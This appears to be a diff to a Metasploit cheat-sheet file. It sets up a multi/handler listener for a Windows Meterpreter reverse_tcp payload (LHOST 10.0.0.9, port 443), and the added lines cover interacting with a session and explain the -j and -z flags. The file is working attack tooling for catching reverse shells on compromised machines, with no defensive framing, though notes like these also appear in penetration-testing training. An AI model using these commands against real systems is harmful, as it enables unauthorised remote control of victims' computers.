@@ -11,7 +11,7 @@ exploit -j -z
 ======================
  SCRIPT Reverse Shell
 ======================
-- msfconsole -r msfremote_shell.rc
+- msfconsole -r msfremote_shell.rc   :: Execute the script
 
 use multi/handler
 set payload windows/meterpreter/reverse_tcp
@@ -19,3 +19,12 @@ set LHOST 10.0.0.9
 set LPORT 443
 set ExitOnSession false
 exploit -j
+
+- sessions -i 1
+
+=========
+ PARAMS
+=========
+ -j flag tells it to run in the context of a job. Running the exploit as a job allows it to run in the background and gives you control of the process running.
+
+ -z simply means to not interact with the session once it becomes active. 
